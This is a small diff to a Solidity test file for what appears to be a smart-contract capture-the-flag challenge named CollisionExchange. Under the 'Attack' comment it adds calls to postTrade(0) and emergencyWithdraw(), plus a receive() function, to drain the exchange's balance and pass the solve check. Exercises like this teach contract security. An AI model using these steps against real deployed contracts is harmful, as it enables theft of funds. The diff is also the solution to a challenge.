@@ -22,9 +22,13 @@ contract CollisionExchangeTest is Test {
         console.log("Initial exchange balance: %s", address(collisionExchange).balance);
 
         // Attack
+        collisionExchange.postTrade(0);
+        collisionExchange.emergencyWithdraw();
 
         // Final log + checking
         console.log("Final exchange balance: %s", address(collisionExchange).balance);
         require(setup.isSolved(), "Attack failed!");
     }
+
+    receive() external payable {}
 }
